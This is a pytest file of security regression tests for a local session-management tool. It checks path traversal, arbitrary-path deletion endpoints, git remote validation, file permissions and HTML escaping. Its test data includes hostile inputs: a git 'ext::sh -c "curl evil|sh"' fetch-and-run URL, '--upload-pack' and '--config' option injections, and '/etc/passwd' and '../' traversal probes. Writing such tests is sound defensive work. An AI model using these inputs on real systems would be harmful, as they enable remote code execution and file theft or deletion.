"""Regression gates for the security sweep.

Each one is a hole that was open, written so that reverting the fix fails the
test. Grouped here rather than scattered because they share one premise: the
token is not the only layer, and every one of these was reachable the moment it
leaked — which, until `/` started requiring it, it did to anyone who asked.
"""
import http.client
import os

import pytest

from harness import Sandbox
from claude_sessions import gui


# ── output styles: `name` is a FILENAME off the wire ─────────────────

def test_an_output_style_name_cannot_escape_its_directory(tmp_path):
    """`save` slugged the name; `read` and `delete` joined it raw, three
    functions apart. `?name=../../../../Users/mab/Documents/notes` read that
    file, and delete removed any .md on the volume."""
    from claude_sessions import outputstyles as os_mod

    outside = tmp_path / 'secret.md'
    outside.write_text('---\nname: secret\n---\n\ntop secret\n', encoding='utf-8')
    styles = tmp_path / 'cfg' / 'output-styles'
    styles.mkdir(parents=True)

    assert os_mod._slug('../../secret') == '-..-secret'.lstrip('-.') or \
        '/' not in os_mod._slug('../../secret')
    for probe in ('../secret', '..\\secret', '../../Users/mab/secret',
                  '/etc/passwd', 'a/../../b'):
        s = os_mod._slug(probe)
        assert '/' not in s and '\\' not in s and not s.startswith('.'), probe
        assert os.path.dirname(os.path.join(str(styles), s + '.md')) == str(styles)


# ── the destructive endpoints ────────────────────────────────────────

def _post(base, path, body):
    import json
    import urllib.request
    req = urllib.request.Request(
        base + path, data=json.dumps(body).encode(),
        headers={'X-Claudectl': gui.TOKEN, 'Content-Type': 'application/json'})
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or b'{}')


@pytest.fixture()
def server(monkeypatch, tmp_path):
    sb = Sandbox(monkeypatch, tmp_path)
    srv = gui.make_server()
    import threading
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    yield sb, f'http://127.0.0.1:{srv.server_address[1]}'
    srv.shutdown()


def test_agent_delete_refuses_a_file_outside_a_managed_root(server, tmp_path):
    """`os.remove(body['file'])` took any path at all."""
    _sb, base = server
    victim = tmp_path / 'important.md'
    victim.write_text('do not delete me', encoding='utf-8')
    code, _d = _post(base, '/api/agents/delete', {'file': str(victim)})
    assert code == 400
    assert victim.exists(), 'the file was deleted anyway'


def test_skill_remove_refuses_a_directory_outside_a_managed_root(server, tmp_path):
    """`shutil.rmtree(body['dir'])` took any path at all, so
    `{"dir": "C:\\\\Users\\\\mab"}` was a recursive delete of the home
    directory."""
    _sb, base = server
    victim = tmp_path / 'home'
    (victim / 'sub').mkdir(parents=True)
    (victim / 'sub' / 'file.txt').write_text('x', encoding='utf-8')
    code, _d = _post(base, '/api/skills/remove', {'dir': str(victim)})
    assert code == 400
    assert (victim / 'sub' / 'file.txt').exists(), 'the tree was deleted anyway'


def test_a_target_cfgdir_the_accounts_do_not_know_is_refused(server, tmp_path):
    """It becomes CLAUDE_CONFIG_DIR for a spawned `claude`. `_cfgdir_ok` was
    correct and simply never consulted, because the parameter is not called
    `cfgdir`."""
    _sb, base = server
    code, d = _post(base, '/api/inject/launch',
                    {'enc': 'D--x', 'sid': 'abc', 'target_cfgdir': str(tmp_path)})
    assert code == 400 and 'target_cfgdir' in str(d.get('error', ''))


# ── git remotes ──────────────────────────────────────────────────────

def test_a_git_remote_must_be_a_git_remote():
    """`git clone ext::sh -c <payload>` executes the payload — `protocol.ext
    .allow` defaults to `user`, and a direct CLI invocation is one. No shell is
    involved; git is the shell. A leading `-` is the other half: the URL sits in
    an option position, which is why callers also pass `--`."""
    from claude_sessions import proc
    for good in ('https://github.com/o/r', 'http://x.example/r.git',
                 'git@github.com:o/r.git', 'ssh://git@x/r'):
        assert proc.remote_url_ok(good), good
    for bad in ('ext::sh -c "curl evil|sh"', '--upload-pack=calc',
                '--config=core.pager=calc', 'file:///etc', '-x', '',
                '   ', 'C:\\Windows\\System32'):
        assert not proc.remote_url_ok(bad), bad


def test_the_clone_terminates_its_options():
    src = open(os.path.join(os.path.dirname(os.path.dirname(
        os.path.abspath(__file__))), 'claude_sessions', 'skills.py'),
        encoding='utf-8').read()
    assert "'--depth', '1', '--', repo_url" in src, \
        'the clone no longer terminates its option list'
    assert src.index('remote_url_ok') < src.index("'clone'"), \
        'the URL is validated AFTER the clone, which is after the payload ran'


# ── the workdir claudectl writes into other people's repositories ────

def test_the_project_workdir_marks_itself_never_commit(tmp_path):
    """`bash-log.txt` is every Bash command Claude Code ran — `export TOKEN=…`,
    `curl -H "Authorization: …"` — and `injected-context.md` is a whole
    transcript. claudectl's own repo gitignores `.claudectl/`; nobody else's
    does, so it landed in users' trees looking like something to commit."""
    from claude_sessions import config as _c
    from claude_sessions import store

    d = store.claudectl_dir(str(tmp_path))
    ign = os.path.join(d, '.gitignore')
    assert os.path.isfile(ign)
    assert '*' in open(ign, encoding='utf-8').read().split('\n')

    # and the writers that only go through write_atomic get it too
    other = tmp_path / 'p2'
    _c.write_atomic(str(other / '.claudectl' / 'injected-context.md'), 'x')
    assert os.path.isfile(str(other / '.claudectl' / '.gitignore'))


def test_the_settings_file_is_not_world_readable(monkeypatch, tmp_path):
    """It carries omniroute_api_key and otel_headers (an Authorization value).
    A no-op on Windows; the point is the POSIX default umask leaving it 0644."""
    from claude_sessions import config as _c
    p = tmp_path / 's.json'
    monkeypatch.setattr(_c, 'settings_file', str(p))
    assert _c.save_settings({'theme': 'default'})
    if os.name != 'nt':
        assert (os.stat(p).st_mode & 0o077) == 0


# ── one request, one response ────────────────────────────────────────

def test_the_job_decide_route_writes_exactly_one_response(server):
    """The `/decide` branch had no `return`, so it fell through and sent a 404
    on the same socket after its own reply — and it is the route every approval
    gate resolves through."""
    import socket

    _sb, base = server
    port = int(base.rsplit(':', 1)[1])
    body = b'{"apply": true}'
    # a raw socket, because http.client stops reading at the first response and
    # the second one is exactly what has to be visible
    s = socket.create_connection(('127.0.0.1', port), timeout=5)
    s.sendall(b'POST /api/job/nope/decide HTTP/1.1\r\n'
              b'Host: 127.0.0.1:%d\r\n'
              b'X-Claudectl: %s\r\n'
              b'Content-Type: application/json\r\n'
              b'Content-Length: %d\r\n\r\n%s'
              % (port, gui.TOKEN.encode(), len(body), body))
    s.settimeout(2.0)
    raw = b''
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            raw += chunk
    except OSError:
        pass
    s.close()
    assert raw.count(b'HTTP/1.') == 1, \
        'one request produced %d responses: %r' % (raw.count(b'HTTP/1.'), raw[:400])


# ── the graph page ───────────────────────────────────────────────────

def test_the_graph_payload_cannot_break_out_of_its_script_block():
    """U+2028/U+2029 are JS line terminators, and `ensure_ascii=False` emits
    them raw into a <script> block."""
    from claude_sessions import connections
    out = connections._script_json({'n': 'a\u2028b\u2029c', 'x': '</script>'})
    assert '\u2028' not in out and '\u2029' not in out and '</' not in out


def test_a_repo_name_cannot_write_html_into_the_graph_legend():
    from claude_sessions import connections
    src = connections._HTML_TEMPLATE
    i = src.index('function buildLegend')
    legend = src[i:src.index('function setView')]
    assert "+hx(r)+" in legend, 'the repo name is concatenated into innerHTML raw'
